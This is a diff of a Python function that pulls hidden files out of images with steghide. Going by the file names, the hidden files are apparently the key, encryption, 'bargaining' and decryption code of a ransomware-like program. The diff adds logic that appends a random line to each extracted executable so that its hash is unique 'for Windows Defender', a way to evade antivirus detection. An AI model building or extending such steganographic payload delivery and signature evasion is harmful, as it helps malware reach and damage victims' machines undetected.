@@ -1,5 +1,5 @@
-#import subprocess
-#import os
+import subprocess
+import os
 
 
 def extract_file(cover_file_path: str, passphrase: str):
@@ -13,7 +13,7 @@ def extract_file(cover_file_path: str, passphrase: str):
     """
 
     steghide_compatible_files: list[str] = ["jpeg", "jpg", "bmp", "wav", "au"]
-    executable_files: list[str] = ["decrypt.exe", "decrypt.py", "encryp.exe", "encrypt.py"]
+    executable_files: list[str] = ["decrypt.exe", "decrypt.py", "encrypt.exe", "encrypt.py"]
 
     # TODO: Use the os module to iterate through current directory to find the pathway to steghide.exe if needed
     steghide_path = 'steghide-0.5.1-win32\steghide\steghide.exe'
@@ -23,12 +23,12 @@ def extract_file(cover_file_path: str, passphrase: str):
     if cover_file_type not in steghide_compatible_files:
         raise TypeError("Unsupported file for Steghide detected!")
 
-    with open ("images.txt", "r") as file:
+    with open("images.txt", "r") as file:
         lines = file.readlines()
         image_containing_key: str = lines[0].strip("\n")
-        image_containing_encryption_code = lines[1].strip("\n")
-        image_containing_bargaining_code = lines[2].strip("\n")
-        image_containing_decryption_code = lines[3].strip("\n")
+        image_containing_encryption_code: str = lines[1].strip("\n")
+        image_containing_bargaining_code: str = lines[2].strip("\n")
+        image_containing_decryption_code: str = lines[3].strip("\n")
 
     # Verifies that the needed images are indeed available; to help with testing
     if os.path.exists(cover_file_path):
@@ -36,10 +36,11 @@ def extract_file(cover_file_path: str, passphrase: str):
     else:
         raise FileNotFoundError(f"The image name/path '{cover_file_path}' does not exist in the current directory."
                                 f"Either the name fed to the variable in the code to be updated or the image "
-                                 f"specified just doesn't exist.")
+                                f"specified just doesn't exist.")
 
     # TODO: Make sure the text file being embedded into contains these names
     # TODO: Test with .exe files
+    extracted_file: str = ""
     if cover_file_path == image_containing_key:
         extracted_file = "key.txt"
     elif cover_file_path == image_containing_encryption_code:  # our .bmp file containing the logic to encrypt
@@ -69,8 +70,7 @@ def extract_file(cover_file_path: str, passphrase: str):
         process.stdin.write(command)
         process.stdin.flush()
 
-        # Prints out what's occurring within the command prompt itself
-        #
+        # Unpacks 2-tuple and prints out what's occurring within the command prompt itself
         output, errors = process.communicate()
 
         # Checks if the file being extracted already exists
@@ -84,8 +84,19 @@ def extract_file(cover_file_path: str, passphrase: str):
         else:
             # Reads the contents of the file and prints them in the console
             with open(extracted_file, "r") as file:
-                contents = file.read()
-                print("Extraction Successful with: " + contents)
+                contents: str = file.read()
+
+            # Ensures the likelihood that an executable file will have a unique hash for Windows Defender
+            if extracted_file in executable_files:
+                import random
+                # Generates a random string consisting of 30 random ASCII characters
+                rand_generated_str: str = ""
+                for _ in range(30):
+                    rand_generated_str += random.choice(ascii.__str__())
+                # Appends randomized string to end of executable file
+                contents += f"\nprint('{rand_generated_str}')"
+
+            print("\nExtraction Successful with:\n" + contents)
 
     # Catches any errors that happen to occur
     except FileNotFoundError as fnfe:
@@ -95,18 +106,5 @@ def extract_file(cover_file_path: str, passphrase: str):
         print(e)
         return
 
-    # Ensures the likelihood that an executable file will have a unique hash for Windows Defender
-    if cover_file_path in executable_files:
-        import random
-
-        # Generates a random string consisting of 30 random ASCII characters
-        rand_generated_str: str = ""
-        for _ in range(30):
-            rand_generated_str += random.choice(ascii.__str__())
-
-        # Appends randomized string to end of executable file
-        contents += f"\nprint('{rand_generated_str}')"
-
     # Returns the embedded code in a string format
     return contents
-
